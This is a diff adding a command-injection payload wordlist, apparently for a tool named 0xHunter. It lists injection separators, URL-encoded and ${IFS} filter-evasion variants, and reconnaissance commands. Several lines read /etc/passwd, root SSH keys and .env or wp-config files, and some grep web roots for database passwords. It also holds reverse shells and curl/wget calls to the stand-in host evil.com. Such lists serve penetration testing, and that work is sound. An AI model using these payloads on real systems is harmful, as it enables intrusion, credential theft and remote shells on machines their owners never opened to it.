@@ -1,0 +1,165 @@
+# 0xHunter Command Injection Payloads
+; id
+| id
+|| id
+& id
+&& id
+$(id)
+; whoami
+| whoami
+; sleep 5
+| sleep 5
+&& sleep 5
+$(sleep 5)
+%0a id
+%0a whoami
+%3B id
+%7C id
+$($(id))
+; nslookup attacker.com
+| nslookup attacker.com
+; dir
+| dir
+& net user
+&& ipconfig
+;${IFS}id
+; ls
+| ls
+& ls
+`ls`
+$(ls)
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; whoami
+| whoami
+& whoami
+`whoami`
+$(whoami)
+; id
+| id
+& id
+`id`
+$(id)
+; uname -a
+| uname -a
+; hostname
+| hostname
+; ifconfig
+| ifconfig
+; netstat -an
+| netstat -an
+; ps aux
+| ps aux
+; env
+| env
+; sleep 5
+| sleep 5
+& sleep 5
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+\n/bin/ls
+;ls${IFS}-la
+$(cat${IFS}/etc/passwd)
+;{ls,}
+;{cat,/etc/passwd}
+;l\s
+;w\hoami
+;c\at /etc/passwd
+%0a ls
+%0a cat /etc/passwd
+%0a whoami
+%0d%0a ls
+%3b ls
+%7c ls
+%26 ls
+%60ls%60
+$(sleep${IFS}5)
+;sleep${IFS}5
+|sleep${IFS}5
+`sleep${IFS}5`
+;echo${IFS}vulnerable
+|echo${IFS}vulnerable
+$(echo${IFS}vulnerable)
+; dir
+| dir
+& dir
+; type C:\Windows\win.ini
+& type C:\Windows\win.ini
+; ipconfig
+| ipconfig
+& ipconfig
+; net user
+| net user
+& net user
+; net localgroup administrators
+; systeminfo
+| systeminfo
+; tasklist
+| tasklist
+; set
+| set
+%0a dir
+%0a ipconfig
+%0a whoami
+;cmd /c dir
+|cmd /c dir
+&cmd /c whoami
+;powershell -c "whoami"
+|powershell -c "whoami"
+;curl http://evil.com
+|curl http://evil.com
+;wget http://evil.com
+|wget http://evil.com
+;bash -i >& /dev/tcp/evil.com/4444 0>&1
+;nc -e /bin/bash evil.com 4444
+;python3 -c 'import socket,subprocess,os;s=socket.socket()'
+;php -r 'passthru($_GET[0]);'
+$(curl http://evil.com)
+$(wget http://evil.com)
+;nslookup evil.com
+|nslookup evil.com
+;dig evil.com
+|dig evil.com
+;ls -la /
+;cat /root/.ssh/id_rsa
+;find / -perm -4000 2>/dev/null
+;find / -name "*.conf" 2>/dev/null
+;find / -name "*.env" 2>/dev/null
+;find / -name "config.php" 2>/dev/null
+;find / -name "wp-config.php" 2>/dev/null
+;find / -name ".env" 2>/dev/null
+;printenv
+;export
+;mount
+;df -h
+;free -m
+;last
+;lastlog
+;w
+;who
+;ss -tlnp
+;ss -an
+;netstat -tlnp
+;iptables -L
+;cat /etc/crontab
+;crontab -l
+;ls /etc/cron.d/
+;ls /etc/cron.daily/
+;ls -la /home/
+;ls -la /root/
+;ls -la /var/www/
+;ls -la /opt/
+;ls -la /srv/
+;find /var/www -name "*.php" 2>/dev/null
+;grep -r "password" /var/www/html/ 2>/dev/null
+;grep -r "DB_PASS" /var/www/ 2>/dev/null
+|python3 -c 'import os;os.system("id")'
+|perl -e 'system("id")'
+|ruby -e 'system("id")'
+|lua -e 'os.execute("id")'
+|php -r 'system("id");'
+|node -e 'require("child_process").exec("id",function(e,s){process.stdout.write(s)})'
